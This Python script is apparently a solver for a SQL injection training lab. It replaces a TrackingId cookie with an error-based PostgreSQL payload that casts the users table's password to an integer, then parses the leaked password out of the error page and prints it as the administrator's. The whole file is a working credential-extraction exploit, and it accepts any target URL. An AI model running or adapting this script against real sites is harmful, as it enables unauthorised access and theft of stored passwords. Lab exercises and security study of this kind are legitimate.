import argparse
import sys
import urllib3
import requests
import urllib.parse
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_proxy_config():
    """Returns the proxy configuration."""
    return {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }


def perform_request(base_url, sql_payload, proxies):
    """
    Sends the request with the SQL payload COMPLETELY REPLACING the cookie's value,
    as instructed by the manual steps to bypass character limits.
    """
    cookies = {'TrackingId': sql_payload}
    try:
        response = requests.get(base_url, cookies=cookies,
                                verify=False, proxies=proxies)
        # We need the full HTML content of the error page to search for the password.
        return response.text
    except requests.RequestException as e:
        print(f"(-) An error occurred during the request: {e}")
        return None


def extract_admin_password(base_url, proxies):
    """
    Constructs the final, correct payload based on the manual exploit chain and
    parses the password from the resulting visible error message.
    """
    print("(+) Crafting payload based on the manual exploit steps...")

    # This payload is the final step from the provided manual walk-through.
    # '                                 -> Breaks out of the string literal.
    # AND 1=CAST((...))                 -> Creates a valid boolean condition.
    # SELECT password FROM users LIMIT 1 -> Subquery to get a single value (the password).
    # CAST(... AS int)                  -> Forces a data type error, leaking the password.
    # --                                -> Comments out the rest of the original query.
    payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    print(f"    ➤ Replacing TrackingId cookie with payload: {payload}\n")

    # This function call sends the payload and gets the full HTML of the error page back.
    response_text = perform_request(base_url, payload, proxies)

    if not response_text:
        print("(-) Did not receive a response from the server.")
        return None

    print("(+) Searching for the password within the returned HTML error message...")

    # The regex is tailored to the PostgreSQL error message:
    # ERROR: invalid input syntax for type integer: "THE_PASSWORD_IS_HERE"
    password_regex = r'invalid input syntax for type integer: "([^"]*)"'
    match = re.search(password_regex, response_text)

    if match:
        # The password is in the first capturing group of our regex.
        password = match.group(1)
        print("(✓) Successfully parsed the error message and extracted the password.\n")
        return password
    else:
        print("(-) Could not find the password pattern in the response. The exploit has failed.")
        print("(-) Full Response Body Received:")
        print(response_text)
        return None


def get_cli_args():
    """Parses command-line arguments."""
    parser = argparse.ArgumentParser(
        description=(
            "Scenario: Automates the specific visible error-based SQL injection lab by replacing the cookie value.\n\n"
            "Example:\n"
            "  python3 final_lab_solver.py https://vulnerable-site.com\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "url", help="Target URL (e.g., https://vulnerable-site.com)")
    return parser.parse_args()


def main():
    """Main function to orchestrate the exploit."""
    proxies = get_proxy_config()
    args = get_cli_args()
    base_url = args.url.strip('/')

    print(f"\n(+) Targeting: {base_url}\n")

    # This attack gets the password in a single, well-crafted request.
    admin_password = extract_admin_password(base_url, proxies)
    if admin_password:
        print(f"(+) Administrator Password: {admin_password}\n")


if __name__ == "__main__":
    main()
